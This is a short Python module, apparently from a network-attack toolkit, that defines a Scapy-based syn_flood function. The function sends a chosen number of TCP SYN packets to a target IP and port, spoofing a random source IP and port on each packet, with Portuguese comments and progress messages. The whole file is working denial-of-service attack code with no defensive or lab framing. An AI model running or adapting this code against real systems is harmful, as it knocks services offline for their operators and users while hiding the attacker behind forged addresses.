from scapy.all import IP, TCP, send
import random



def syn_flood(target_ip, target_port, count, callback=None):
    """
    Perform a SYN flood attack on target IP and port.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        count: Number of SYN packets to send
        callback: Optional function to call for progress updates
        
    Returns:
        Number of packets sent
    """
    if callback:
        callback(f"--- A iniciar SYN Flood em {target_ip}:{target_port} ---")
    
    sent = 0
    try:
        for i in range(count):
            # Gerar um IP de origem aleatório (IP Spoofing)
            # Nota: Dependendo da rede, o ISP pode bloquear pacotes com IPs falsos.
            src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            src_port = random.randint(1024, 65535)
            
            # Construir o pacote IP e TCP com flag "S" (SYN)
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            
            # Enviar o pacote (verbose=0 para não encher o terminal)
            send(packet, verbose=0)
            
            sent += 1
            if sent % 100 == 0 and callback:
                callback(f"Pacotes enviados: {sent}/{count}")
    
    except KeyboardInterrupt:
        if callback:
            callback("SYN Flood interrompido pelo utilizador")
    except Exception as e:
        if callback:
            callback(f"Erro: {str(e)}")
    
    return sent